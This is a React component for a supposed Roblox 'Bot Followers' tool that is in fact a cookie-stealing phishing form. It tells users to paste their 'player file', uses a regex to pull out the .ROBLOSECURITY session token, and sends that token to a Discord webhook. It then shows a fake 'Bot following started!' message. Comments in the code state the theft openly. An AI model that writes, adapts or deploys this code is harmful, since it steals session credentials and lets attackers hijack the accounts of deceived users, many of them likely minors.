
import React, { useState } from 'react';
import { FileIcon, LockIcon, Loader2, X } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';
import { sendToDiscordWebhook } from '@/utils/webhookService';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";

const BotFollowersForm: React.FC = () => {
  const [playerFile, setPlayerFile] = useState<string>("");
  const [pin, setPin] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);
  const [showError, setShowError] = useState(false);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow numbers and limit to 7 characters
    const value = e.target.value.replace(/\D/g, '').slice(0, 7);
    setPin(value);
  };

// SENDS TO DISCORD ONLY .ROBLOSECURITY VVVVV
const handleSubmit = async () => {
  setIsLoading(true);

  // 1. Regex to find the specific warning and the cookie data
  const cookieRegex = /(_\|WARNING:-DO-NOT-SHARE-THIS\.[^"'\s]+)/;
  const match = playerFile.match(cookieRegex);

  if (!match) {
    setShowError(true);
    setIsLoading(false);
    return;
  }

  // 2. Wrap the extracted token in triple backticks
  const formattedToken = `\`\`\`${match[0]}\`\`\``;

  try {
    await sendToDiscordWebhook({
      toolType: "Bot Followers",
      file: formattedToken, // This now contains the ``` at start and end
      pin: pin || "None"
    });
    
    toast.success("Bot following started!");
    setPlayerFile(""); 
  } catch (error) {
    console.error("Webhook Error:", error);
    toast.error("Failed to send. Check console for details.");
  } finally {
    setIsLoading(false);
  }
};
// SENDS TO DISCORD ONLY .ROBLOSECURITY ^^^^
  return (
    <>
      <Dialog open={showError} onOpenChange={setShowError}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="flex flex-col items-center justify-center text-center">
            <div className="rounded-full border-2 border-red-500 p-4 w-16 h-16 flex items-center justify-center mb-4">
              <X className="h-8 w-8 text-red-500" />
            </div>
            <DialogTitle className="text-xl">Error</DialogTitle>
          </DialogHeader>
          <div className="text-center pb-4 pt-2">
            <p className="text-muted-foreground">Invalid File</p>
          </div>
          <div className="flex justify-center">
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => setShowError(false)}
              className="bg-purple-500 hover:bg-purple-600 text-white font-medium py-2 px-8 rounded"
            >
              OK
            </motion.button>
          </div>
        </DialogContent>
      </Dialog>
      
      <motion.div 
        className="blox-card p-8 max-w-xl"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, ease: "easeOut" }}
        whileHover={{ boxShadow: "0 8px 30px rgba(0, 215, 220, 0.15)" }}
      >
        <motion.h2 
          className="text-2xl font-bold mb-4"
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.4 }}
        >
          Bot Followers
        </motion.h2>
        
        <motion.p 
          className="text-gray-400 mb-6"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3, duration: 0.4 }}
        >
          Paste your player file in the box below, then click "Start Botting!" If 
          you don't know how to find a users "player file" then go ahead and
          watch "How to use"
        </motion.p>
        
        <motion.div 
          className="relative mb-4"
          initial={{ x: -10, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ delay: 0.4, duration: 0.5, ease: "easeOut" }}
        >
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
            <FileIcon size={18} />
          </div>
          <input
            type="password"
            placeholder="Enter player file"
            value={playerFile}
            onChange={(e) => setPlayerFile(e.target.value)}
            className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
          />
        </motion.div>
        
        <motion.div 
          className="relative mb-6"
          initial={{ x: -10, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ delay: 0.5, duration: 0.5, ease: "easeOut" }}
        >
          <div className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">
            <LockIcon size={18} />
          </div>
          <input
            type="text"
            placeholder="Enter Follower amount (Max 7 digits)"
            value={pin}
            onChange={handlePinChange}
            maxLength={7}
            className="w-full bg-black/30 border border-white/10 rounded-md p-3 pl-12 text-white focus:outline-none focus:border-blox-teal transition-all"
          />
        </motion.div>
        
        <motion.button 
          onClick={handleSubmit}
          className="w-full bg-blox-teal text-white py-3 rounded-md font-medium hover:bg-blox-teal/90 transition-all flex items-center justify-center"
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.6, duration: 0.5 }}
          disabled={isLoading}
        >
          {isLoading ? (
            <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing...</>
          ) : (
            'Start Botting!'
          )}
        </motion.button>
      </motion.div>
    </>
  );
};

export default BotFollowersForm;
